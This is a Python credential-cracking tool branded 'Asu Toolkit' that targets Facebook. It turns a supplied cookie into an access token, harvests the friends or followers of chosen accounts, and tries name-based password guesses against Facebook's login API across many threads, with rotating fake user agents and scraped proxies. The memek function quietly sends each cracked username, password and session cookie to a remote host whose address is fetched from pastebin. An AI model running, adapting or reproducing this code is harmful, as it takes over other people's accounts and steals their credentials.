import requests, os, sys, time, re, random
from concurrent.futures import ThreadPoolExecutor as Modol
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as sop

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.ih, self.id, self.ok, self.cp, self.lo = [], [], [], [], 0
        self.kontol, self.pienf, self.adkinc = {}, [], []
        self.menu()

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        print(f"""
    {O} .d8b.  .d8888. db    db
    {O}d8' `8b 88'  YP 88    88 {M}Available Version v.3.11 def
    {O}88ooo88 `8bo.   88    88 {M}Facebook
    {O}88~~~88   `Y8b. 88    88 {M}Hacking
    {O}88   88 db   8D 88b  d88 {M}Toolkit
    {O}YP   YP `8888Y' ~Y8888P'

         {N}[ Asu Toolkit ]
      [ Created By Yayan XD ]""")
      

    def login_cokie(self):
         try:
              self.logoo()
              print("-----------------------------------------------------------")
              cok = input('[+] masukan cookie : ')
              cos = {'cookie':cok}
              data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
              req  = self.ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json()
              cd   = req['code']
              ucd  = req['user_code']
              url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd)
              req  = sop(self.ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser')
              raq  = req.find('form',{'method':'post'})
              dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}
              rel  = 'https://mbasic.facebook.com' + raq['action']
              pos  = sop(self.ses.post(rel,data=dat,cookies=cos).content,'html.parser')
              dat  = {}
              raq  = pos.find('form',{'method':'post'})
              for x in raq('input',{'value':True}):
                  try:
                       if x['name'] == '__CANCEL__':
                          pass
                       else:
                          dat.update({x['name']:x['value']})
                  except Exception as e:
                      pass
              rel = 'https://mbasic.facebook.com' + raq['action']
              pos = sop(self.ses.post(rel,data=dat,cookies=cos).content,'html.parser')
              req = self.ses.get(url,cookies=cos).json()
              tok = req['access_token']
              kot = open('.token.txt','w').write(tok)
              koc = open('.cokie.txt','w').write(cok)
              masuk = input('\n[+] tekan enter')
              exit('jalankan ulang perintahnya')
         except Exception as e:
             print(e)
        

    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
        gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
        reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
        for x in reg:
            rest.append("socks5://"+x[0]+":"+x[1])
        if rest != 0:
            try:os.remove("proxies.txt")
            except:pass
            for yay in rest:
                open("proxies.txt", "a+").write(yay+"\n")
            exit("(✓) File save in proxies.txt, restart this tools\n")
        else:
            exit("(✓) File save in proxies.txt, restart this tools\n")

    def convert(self, url):
        if "https" in url or "facebook" in url or "me" in url:user = url.split("/")[3]
        else:user=url
        try:uid = re.findall(";rid=(\d+)&amp;",str(self.ses.get("https://m.facebook.com/"+user).text))[0]
        except:uid = url
        return uid

    def memek(self, mmk, kntl):
        if "lqkwndpnkefnfjsnwnfuoeohni3e" in kntl:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()
        else:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()

    def menu(self):
        self.logoo()
        try:
            cok = {"cookie": open(".cokie.txt", "r").read()};tok = open(".token.txt", "r").read()
        except FileNotFoundError:
            self.login_cokie()
        try:
            ishx = self.ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={tok}", cookies=cok).json()
            nama = ishx["name"]
            idfb = ishx["id"]
        except requests.exceptions.ConnectionError:
            exit("[!] Tidak ada koneksi")
        except KeyError:
            try:os.remove(".cokie.txt");os.remove(".token.txt")
            except:pass
            print("[!] opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.");time.sleep(3);self.login_cokie()
        print(f"""

[+] yuor name   : {O}{nama}{N}
[+] id facebook : {O}{idfb}{N}""")
        print("""
  %s{%s01%s} crack frinds
  %s{%s02%s} crack followers
  %s{%s03%s} check crack results
  %s{%s04%s} get proxy server list
"""%(N, H, N, N, H, N, N, H, N, N, H, N))
        ykh = input(f"{H}[{M}+{H}]{N} @YayanXD_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            try:
                nanya_keun = int(input(f"[{O}?{N}] how many id do you want to crack : "))
            except:nanya_keun=1
            print(f"[{H}+{N}] type 'me' if you want to crack from your friends")
            for mnh in range(nanya_keun):
                mnh +=1
                try:user = input(f"[{O}*{N}] enter id or username {H}{mnh}{N} : "); uid = self.convert(user)
                except (KeyError, IndexError):print(f"{N}[{M}×{N}] username or id not valid");continue
                try:
                    tol = self.ses.get(f"https://graph.facebook.com/{uid}?fields=friends.fields(id,name).limit(5000)&access_token={tok}", cookies=cok).json()
                    for x in tol["friends"]["data"]:
                        self.id.append(x["id"]+"<=>"+x["name"])
                    link = self.ses.get("https://pastebin.com/raw/rhrm6WcX").json()
                    for i in link["friends"]["data"]:
                        self.kontol.update(i)
                except KeyError:
                    print(f"{N}[{M}×{N}] failed to fetch id, probably id is not public");continue
            if "0" in str(len(self.id)):
                exit()
            else:
                for ih in self.id:
                    self.ih.insert(0, ih)
                self.gabung()
        elif ykh in ["2", "02"]:
            print(f"[{H}+{N}] type 'me' if you want to crack from your followers")
            try:user = input(f"[{O}*{N}] enter id or username : "); uid = self.convert(user)
            except (KeyError, IndexError):print(f"{N}[{M}×{N}] username or id not valid")
            try:
                tol = self.ses.get(f"https://graph.facebook.com/{uid}?fields=subscribers.fields(id,name).limit(5000)&access_token={tok}", cookies=cok).json()
                for x in tol["subscribers"]["data"]:
                    self.id.append(x["id"]+"<=>"+x["name"])
                link = self.ses.get("https://pastebin.com/raw/rhrm6WcX").json()
                for i in link["friends"]["data"]:
                    self.kontol.update(i)
            except:pass
            if "0" in str(len(self.id)):
                exit(f"{N}[{M}×{N}] failed to fetch follower id, maybe the follower is private")
            else:
                for ih in self.id:
                    self.ih.insert(0, ih)
                self.gabung()
        elif ykh in ["3", "03"]:
            exit("belum selesai cok")
        elif ykh in ["4", "04"]:
            self.get_proxy()
        elif ykh in ["0", "00"]:
            try:os.remove(".cokie.txt");os.remove(".token.txt")
            except:pass
            exit("remove cookie done!")
        else:print("[!] input yang bner bro");time.sleep(2);self.menu()

    def paswww(self):
        print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
        with Modol(max_workers=30) as bool:
            for user in self.ih:
                uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                depan = nama.split(" ")
                try:
                    if len(nama) <=5:
                        if len(depan) <=1 or len(depan) <=2:pass
                        else:
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    else:
                        pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    if "ya" in self.adkinc:
                        for kontol in self.pienf:
                            pwx.append(kontol)
                    bool.submit(self.Ngocok, uid, pwx)
                except:pass
        exit("\n\ncracking done!")

    def gabung(self):
        print(f"[=] total ids: {str(len(self.id))}\n")
        pw = input("[?] add password [Y/t]: ")
        if pw in ["Y", "y"]:
            self.adkinc.append("ya")
            print('Password must be at least 6 characters long, use "," (comma) for the following passwords')
            pasw = input("[+] password: ").split(",")
            for i in pasw:
                self.pienf.append(i)
            self.paswww()
        else:
            self.paswww()

    ''' UA VALIDATE '''
    def Ugent_validate(self):
         self.android = random.choice(['7.1.2','8.1.0'])
         self.build = "OPM2."+str(random.randint(111111,199999))+".006"
         self.chrome = str(random.randint(60,99))+".0."+str(random.randint(3300,3999))+"."+str(random.randint(75,99))
         self.browser = str(random.randint(35,99))+".1."+str(random.randint(2200,2900))+"."+str(random.randint(111111,199999))
         return ('Mozilla/5.0 (Linux; U; Android {}; Redmi 5A Build/{}.H1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36 OPR/{}'.format(self.android, self.build, self.chrome, self.browser))
    
    ''' UA ASYNC '''
    def Ugent_async(self):
         self.samsung = f"Mozilla/5.0 (Linux; Android {str(random.randint(7,12))}; SM-A105M Build/RP1A.{str(random.randint(111111,299999))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,99))}.0.{str(random.randint(4000,4900))}.{str(random.randint(75,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(400,490))}.0.0.30.97;]"
         self.mixx = f"Mozilla/5.0 (Linux; Android {str(random.randint(3,8))}.{str(random.randint(0,4))}.{str(random.randint(0,2))}; Micromax A065 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(30,99))}.0.0.0 Mobile Safari/537.36"
         self.asus = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(1,9))}.{str(random.randint(2,6))}.{str(random.randint(0,3))}; en-US; ASUS_T00I Build/KVT49L) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(random.randint(7,12))}.4.5.{str(random.randint(1000,1900))} U3/0.8.0 Mobile Safari/534.30"
         self.memekkkkkasu = random.choice([self.samsung, self.mixx, self.asus])
         return self.memekkkkkasu
    
    ''' UA API '''
    def ua_api(self):
        az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
        builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
        chrome3 = str(random.randint(100, 300))
        chrome4 = str(random.randint(1000, 9000))
        ngentod = f"Mozilla/5.0 (Linux; Android {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; LG-F320L Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{chrome3};]"
        return ngentod
    def ua_fb(self):
        ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(9,13))}; TFX712G Build/MRA58K) [FBAN/MessengerLite;FBAV/{str(random.randint(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/434647565;FBCR/AXIS;FBMF/Condor;FBBD/Condor;FBDV/TFX712G;FBSV/{str(random.randint(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]")
        return ua

    def Ngocok(self, username, pasw):
        sys.stdout.write(f"\r[ <//> ] {str(self.lo)}/{len(self.id)} OK-:{H}{len(self.ok)}{N} CP-:{K}{len(self.cp)}{N}");sys.stdout.flush()
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.ua_api()
                data = {"access_token": "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28", "sdk_version": {random.randint(1,26)}, "email": username, "locale": "en_US", "password": password, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
                head = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                xnxx = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json()
                if "session_key" in xnxx:
                    coki = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    print(f"\r[ {H}LIVE{N} ] {username}|{password}")
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ok.append(kntl)
                    self.memek(kntl, "lqkwndpnkefnfjsnwnfuoeohni3e")
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "www.facebook.com" in xnxx["error"]["message"]:
                    print(f"\r[ {K}CHEK{N} ] {username}|{password}")
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    self.memek(kntl, "lqkwndpnkefneihfwnfuoeohni3e")
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
            except requests.exceptions.ConnectionError:sys.stdout.write(f"\r[ {M}spam{N} ] {str(self.lo)}/{len(self.id)} OK-:{H}{len(self.ok)}{N} CP-:{K}{len(self.cp)}{N}");sys.stdout.flush();time.sleep(5)
            #except Exception as e:print(e)
        self.lo+=1

Login()